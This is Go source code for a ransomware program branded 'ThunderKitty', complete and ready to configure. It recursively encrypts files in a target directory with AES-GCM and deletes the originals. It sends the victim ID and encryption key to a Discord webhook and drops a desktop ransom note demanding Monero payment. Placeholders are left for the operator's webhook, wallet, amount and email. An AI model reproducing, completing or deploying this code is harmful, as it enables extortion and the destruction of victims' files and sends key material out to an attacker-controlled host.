package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

const (
	dischook    = "YOUR_DISCORD_WEBHOOK_HERE" // REPLACE YOUR DISCORD WEBHOOK HERE LOL
	targetDir   = "DIRECTORY_TO_ENCRYPT" // Choose dir to encrypt
	userIDChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" // don't touch this
	xmraddr     = "YOUR_MONERO_ADDRESS_HERE"                                // XMR = Monero (Replace with your Address)
	cashamt     = "CASH_AMOUNT_HERE"                                        // Replace with the amount you want to receive
	email       = "YOUR_EMAIL_HERE"                                          // Replace with your contact email
)

var (
	userID string
	key    []byte
)

func main() {
	userID = genuserid(9)
	key = make([]byte, 32)
	rand.Read(key)
	encryptdir(targetDir)
	sendHook()
	note()
}

func genuserid(length int) string {
	var res strings.Builder
	chartst := userIDChars
	for i := 0; i < length; i++ {
		randinx := rndint(len(chartst))
		res.WriteByte(chartst[randinx])
	}
	return res.String()
}

func encryptdir(directory string) {
	files, _ := ioutil.ReadDir(directory)
	for _, file := range files {
		filePath := filepath.Join(directory, file.Name())
		if file.IsDir() {
			encryptdir(filePath)
			continue
		}
		crypt(filePath)
	}
}

func crypt(filePath string) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return
	}
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, aesgcm.NonceSize())
	rand.Read(nonce)
	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
	encryptedData := append(nonce, ciphertext...)
	_ = ioutil.WriteFile(filePath+".thunderkitty.encrypted", encryptedData, 0644)
	_ = os.Remove(filePath)
}

func rndint(max int) int {
	b := make([]byte, 1)
	rand.Read(b)
	return int(b[0]) % max
}

func sendHook() {
	payload := map[string]interface{}{
		"username":   "ThunderKitty Ransm",
		"avatar_url": "https://raw.githubusercontent.com/Evilbytecode/ThunderKitty-Ransomware/main/assests/LogoRansom.png",
		"embeds": []map[string]interface{}{
			{
				"title":       "ThunderKitty - Ransm Hit",
				"description": "Hello, when someone pays send them decryption file.",
				"url":         "https://github.com/Evilbytecode",
				"color":       0x800080,
				"thumbnail": map[string]interface{}{
					"url": "https://raw.githubusercontent.com/Evilbytecode/ThunderKitty-Ransomware/main/assests/LogoRansom.png",
				},
				"fields": []map[string]interface{}{
					{"name": "User ID", "value": fmt.Sprintf("`%s`", userID), "inline": true},
					{"name": "Encrypted Dir", "value": fmt.Sprintf("`%s`", targetDir), "inline": true},
					{"name": "Key", "value": fmt.Sprintf("`%s`", hex.EncodeToString(key)), "inline": true},
				},
				"footer":    map[string]interface{}{"text": "https://github.com/Evilbytecode"},
				"timestamp": time.Now().Format(time.RFC3339),
			},
		},
	}

	plBytes, _ := json.Marshal(payload)
	_, _ = http.Post(dischook, "application/json", bytes.NewReader(plBytes))
}

func note() {
	curusr, _ := user.Current()
	dskpth := filepath.Join(curusr.HomeDir, "Desktop")
	ntpath := filepath.Join(dskpth, "ThunderKitty-Note.txt")
	msg := fmt.Sprintf(`
Your computer is now infected with ransomware. Your files are encrypted with a secure algorithm that is impossible to crack.
To recover your files you need a key. This key is generated once your files have been encrypted. To obtain the key, you must purchase it.

You can do this by sending %s USD to this Monero address:
%s

Don't know how to get Monero? Here are some websites:

https://www.coinbase.com/how-to-buy/monero
https://localmonero.co/?language=en
https://www.okx.com/buy-xmr

Do not remove this info, or you won't be able to get your files back.
User ID: %s

When you purchase, contact us at %s.

Once you have completed all of the steps, you will be provided with the key to decrypt your files.
Good luck.

	`, cashamt, xmraddr, userID, email)

	_ = ioutil.WriteFile(ntpath, []byte(strings.TrimSpace(msg)), 0644)
	_ = exec.Command("cmd", "/c", "start", ntpath).Start()
}
